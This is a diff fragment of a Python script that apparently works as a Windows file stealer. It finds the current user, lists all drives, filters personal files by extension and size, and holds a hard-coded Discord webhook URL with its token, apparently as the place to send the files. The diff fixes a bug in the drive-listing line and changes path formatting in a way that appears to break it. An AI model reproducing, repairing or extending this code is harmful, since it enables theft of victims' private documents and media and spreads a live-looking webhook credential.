@@ -24,14 +24,14 @@ for hwnd in windows:
 
 user = getpass.getuser()
 
-path = "C:\\Users\\%s" % user
+path = "C:\\Users\\%a" % user
 
 
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1183011750610751539/5pbfhYiAne_g_NT1DXKX_m6wDxrwpsJvmYxP6YSUIkY6fflQS6YVsiJnGOcpmB3-kF9_"
 # Directories to ignore during file search
-BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\%s\\AppData\\', 'C:\\Users\\%s\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\']
+BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\%a\\AppData\\', 'C:\\Users\\%a\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\']
 MAX_FILE_SIZE_MB = 8
 def check_file(file_path):
     allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.docx', '.xls', '.xlsx', '.docx', '.wav', '.xlsm', '.zip', '.mpeg', '.csv']
@@ -80,7 +80,7 @@ def thread_files(root_dirs):
     for root_dir in root_dirs:
         search_files(root_dir)
 # Get a list of all available drives
-drives = ["%s:\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
+drives = ["%s:\\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
 # Split the drives into groups of 4
 drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]
 # Search for files in each group in parallel
